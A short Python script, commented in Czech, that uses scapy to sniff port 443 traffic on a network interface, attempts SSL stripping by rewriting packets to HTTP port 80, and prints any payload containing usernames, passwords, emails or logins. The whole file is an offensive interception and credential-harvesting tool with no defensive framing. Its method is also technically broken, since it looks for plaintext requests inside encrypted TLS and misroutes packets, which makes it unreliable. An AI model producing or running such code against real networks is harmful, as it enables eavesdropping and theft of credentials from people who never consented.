from scapy.all import *
import re

# Funkce pro SSL stripping a odposlech HTTP(S) paketů
def packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(IP):
        # Odposlouchávání HTTPS (port 443) a přesměrování na HTTP (port 80)
        if pkt.haslayer(TLS):
            if b"GET" in pkt.load or b"POST" in pkt.load:
                try:
                    # Vypisuje URL, kterou navštěvujeme
                    url = re.search(r"(https?://[^\s]+)", str(pkt.load))
                    if url:
                        print(f"SSL stripping na URL: {url.group(0)}")
                except Exception as e:
                    print(f"Chyba při zpracování paketu: {e}")
            
                # Změníme HTTPS na HTTP pro SSL stripping
                pkt[IP].dst = pkt[IP].src  # Přesměruje zpět na klienta
                pkt[TCP].dport = 80  # Port pro HTTP
                del pkt[IP].len
                del pkt[IP].chksum
                del pkt[TCP].chksum
                send(pkt)

        # Případné extrahování citlivých údajů
        if pkt.haslayer(Raw):
            payload = pkt.getlayer(Raw).load
            # Hledání uživatelského jména, hesla nebo emailu
            if re.search(r"(username|password|email|login)", str(payload)):
                print("Nalezena citlivá data: ")
                print(payload)

# Zastavení odposlechu na specifickém rozhraní a portu
def start_sniffing(interface="eth0"):
    print(f"Začínám odposlouchávat na rozhraní {interface}")
    sniff(iface=interface, prn=packet_callback, filter="tcp port 443", store=0)

# Spuštění snifferu
start_sniffing()
